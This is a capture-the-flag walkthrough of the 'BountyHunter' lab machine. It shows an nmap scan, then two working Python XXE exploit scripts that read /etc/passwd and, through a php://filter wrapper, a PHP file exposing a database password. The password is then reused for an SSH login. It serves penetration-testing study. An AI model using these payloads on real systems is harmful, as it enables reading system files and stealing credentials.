# BountyHunter (Easy - Linux)

## Recon
### Nmap
```console
# nmap -Pn --open -sC -sV -p- 10.10.11.100
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-24 04:02 GMT
Nmap scan report for 10.10.11.100
Host is up (0.024s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Bounty Report System - BETA
```
http://10.10.11.100/tracker_diRbPr00f314.php
```

## Initial Access
### XXE (XML External Entity)
Exploit (xxe_exploit.py):
```python
#!/usr/bin/python3

import requests
import base64

def xxe(url, endpoint):

	payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [ <!ENTITY bigb0ss SYSTEM "file:///etc/passwd"> ]>  
           <bugreport>  
           <title>&bigb0ss;</title>  
           <cwe>no</cwe>  
           <cvss>no</cvss>  
           <reward>no</reward>  
           </bugreport>"""

	payload_bytes = payload.encode('ascii')
	payload_b64enc = base64.b64encode(payload_bytes)
	payload_b64 = payload_b64enc.decode('ascii')

	#print(payload_b64)

	data = {
		"data": payload_b64,
	}

	r = requests.post(url + endpoint, data=data)

	#print(r.status_code)
	print(r.text)

	return



if __name__ == '__main__':
	url = "http://10.10.11.100"
	endpoint = "/tracker_diRbPr00f314.php"

	xxe(url, endpoint)
```

Response:
```
# python3 xxe_exploit.py
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>no</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>no</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>no</td>
  </tr>
</table>
```

#### Reading dp.php for Getting Credentials

Exploit (xxe_exploit2.php)
```python
#!/usr/bin/python3

import requests
import base64

def xxe(url, endpoint):

	payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [ <!ENTITY bigb0ss SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]>  
           <bugreport>  
           <title>no</title>  
           <cwe>no</cwe>  
           <cvss>no</cvss>  
           <reward>&bigb0ss;</reward>  
           </bugreport>"""

	payload_bytes = payload.encode('ascii')
	payload_b64enc = base64.b64encode(payload_bytes)
	payload_b64 = payload_b64enc.decode('ascii')

	#print(payload_b64)

	data = {
		"data": payload_b64,
	}

	r = requests.post(url + endpoint, data=data)

	#print(r.status_code)
	print(r.text)

	return


if __name__ == '__main__':
	url = "http://10.10.11.100"
	endpoint = "/tracker_diRbPr00f314.php"

	xxe(url, endpoint)
```

Decoding base64 Encoded `dp.php` output:
```console
# echo -n "PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=" | base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

### SSH Login as development
```console
# ssh development@10.10.11.100
The authenticity of host '10.10.11.100 (10.10.11.100)' can't be established.
ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.100' (ECDSA) to the list of known hosts.
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 29 Nov 2021 12:50:25 AM UTC

  System load:  0.0               Processes:             210
  Usage of /:   23.6% of 6.83GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for eth0: 10.10.11.100
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
development@bountyhunter:~$ uname -a
Linux bountyhunter 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

